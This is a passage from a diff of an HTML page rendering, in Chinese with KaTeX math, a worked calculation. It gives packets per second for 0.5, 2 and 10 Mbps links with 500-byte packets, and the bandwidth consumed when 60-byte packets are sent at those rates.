style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">500</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">&#xD7;</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">8</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord">4000</span><span class="mord mathnormal">bi</span><span class="mord mathnormal">t</span></span></span></span>&#x3002;&#x56E0;&#x6B64;&#x6BCF;&#x79D2;&#x9700;&#x8981;&#x6570;&#x636E;&#x5305;&#x4E2A;&#x6570;&#x4E3A;&#xFF1A;<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>5</mn><mo>&#xD7;</mo><mn>1</mn><msup><mn>0</mn><mn>5</mn></msup><mi mathvariant="normal">/</mi><mn>4000</mn><mo>=</mo><mn>125</mn></mrow><annotation encoding="application/x-tex">5\times 10^5/4000=125</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">5</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">&#xD7;</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span></span></span></span></span><span class="mord">/4000</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">125</span></span></span></span></li>
+<li>2Mbps&#xFF1A;&#x94FE;&#x8DEF;&#x5BB9;&#x91CF;&#x4E3A;<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn><mo>&#xD7;</mo><mn>1</mn><msup><mn>0</mn><mn>6</mn></msup><mo>=</mo><mn>2</mn><mo>&#xD7;</mo><mn>1</mn><msup><mn>0</mn><mn>6</mn></msup><mi>b</mi><mi>i</mi><mi>t</mi><mi mathvariant="normal">/</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">2\times 10^6=2\times 10^6bit/s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">&#xD7;</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">&#xD7;</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span></span></span></span></span><span class="mord mathnormal">bi</span><span class="mord mathnormal">t</span><span class="mord">/</span><span class="mord mathnormal">s</span></span></span></span>,&#x6570;&#x636E;&#x5305;&#x7684;&#x5927;&#x5C0F;&#x4E3A;<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>500</mn><mo>&#xD7;</mo><mn>8</mn><mo>=</mo><mn>4000</mn><mi>b</mi><mi>i</mi><mi>t</mi></mrow><annotation encoding="application/x-tex">500\times 8=4000bit</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">500</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">&#xD7;</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">8</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord">4000</span><span class="mord mathnormal">bi</span><span class="mord mathnormal">t</span></span></span></span>&#x3002;&#x56E0;&#x6B64;&#x6BCF;&#x79D2;&#x9700;&#x8981;&#x6570;&#x636E;&#x5305;&#x4E2A;&#x6570;&#x4E3A;&#xFF1A;<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn><mo>&#xD7;</mo><mn>1</mn><msup><mn>0</mn><mn>6</mn></msup><mi mathvariant="normal">/</mi><mn>4000</mn><mo>=</mo><mn>500</mn></mrow><annotation encoding="application/x-tex">2\times 10^6/4000=500</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">&#xD7;</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span></span></span></span></span><span class="mord">/4000</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">500</span></span></span></span></li>
+<li>10Mbps&#xFF1A;&#x94FE;&#x8DEF;&#x5BB9;&#x91CF;&#x4E3A;<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>10</mn><mo>&#xD7;</mo><mn>1</mn><msup><mn>0</mn><mn>6</mn></msup><mo>=</mo><mn>1</mn><msup><mn>0</mn><mn>7</mn></msup><mi>b</mi><mi>i</mi><mi>t</mi><mi mathvariant="normal">/</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">10\times 10^6=10^7bit/s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">10</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">&#xD7;</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">7</span></span></span></span></span></span></span></span><span class="mord mathnormal">bi</span><span class="mord mathnormal">t</span><span class="mord">/</span><span class="mord mathnormal">s</span></span></span></span>,&#x6570;&#x636E;&#x5305;&#x7684;&#x5927;&#x5C0F;&#x4E3A;<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>500</mn><mo>&#xD7;</mo><mn>8</mn><mo>=</mo><mn>4000</mn><mi>b</mi><mi>i</mi><mi>t</mi></mrow><annotation encoding="application/x-tex">500\times 8=4000bit</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">500</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">&#xD7;</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">8</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord">4000</span><span class="mord mathnormal">bi</span><span class="mord mathnormal">t</span></span></span></span>&#x3002;&#x56E0;&#x6B64;&#x6BCF;&#x79D2;&#x9700;&#x8981;&#x6570;&#x636E;&#x5305;&#x4E2A;&#x6570;&#x4E3A;&#xFF1A;<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><msup><mn>0</mn><mn>7</mn></msup><mi mathvariant="normal">/</mi><mn>4000</mn><mo>=</mo><mn>2500</mn></mrow><annotation encoding="application/x-tex">10^7/4000=2500</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">7</span></span></span></span></span></span></span></span><span class="mord">/4000</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2500</span></span></span></span><br>
+&#x6D88;&#x8017;&#x5E26;&#x5BBD;&#xFF1A;</li>
+<li>0.5Mbps&#xFF1A;&#x6570;&#x636E;&#x5305;&#x5927;&#x5C0F;&#x4E3A;60&#x5B57;&#x8282;&#xFF0C;&#x5E26;&#x5BBD;&#xFF1A;<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>125</mn><mo>&#xD7;</mo><mn>60</mn><mo>=</mo><mn>7500</mn><mi>b</mi><mi>y</mi><mi>t</mi><mi>e</mi><mi>s</mi><mi mathvariant="normal">/</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">125\times 60=7500bytes/s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">125</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">&#xD7;</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">60</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">7500</span><span class="mord mathnormal">b</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord mathnormal">t</span><span class="mord mathnormal">es</span><span class="mord">/</span><span class="mord mathnormal">s</span></span></span></span>&#x3002;</li>
+<li>2Mbps&#xFF1A;&#x5E26;&#x5BBD;&#xFF1A;<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>500</mn><mo>&#xD7;</mo><mn>60</mn><mo>=</mo><mn>30000</mn><mi>b</mi><mi>y</mi><mi>t</mi><mi>e</mi><mi>s</mi><mi mathvariant="normal">/</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">500\times 60=30000bytes/s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">500</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">&#xD7;</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">60</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">30000</span><span class="mord mathnormal">b</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord mathnormal">t</span><span class="mord mathnormal">es</span><span class="mord">/</span><span class="mord mathnormal">s</span></span></span></span></li>
+<li>10Mbps&#xFF1A;&#x5E26;&#x5BBD;&#xFF1A;<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2500</mn><mo>&#xD7;</mo><mn>60</mn><mo>=</mo><mn>150000</mn><mi>b</mi><mi>y</mi><mi>t</mi><mi>e</mi><mi>s</mi><mi mathvariant="normal">/</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">2500\times 60=150000bytes/s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">2500</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">&#xD7;</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">60</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">150000</span><span class="mord mathnormal">b</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord mathnormal">t</span><span class="mord mathnormal">es</span><span class="mord">/</span><span class="mord mathnormal">s</span></span></span></span></li>
+</ul>
+
+      </div>
+      
+      
+    
+    
+    
+    
+    
+    
+    
+    
+  
+    </body></html>
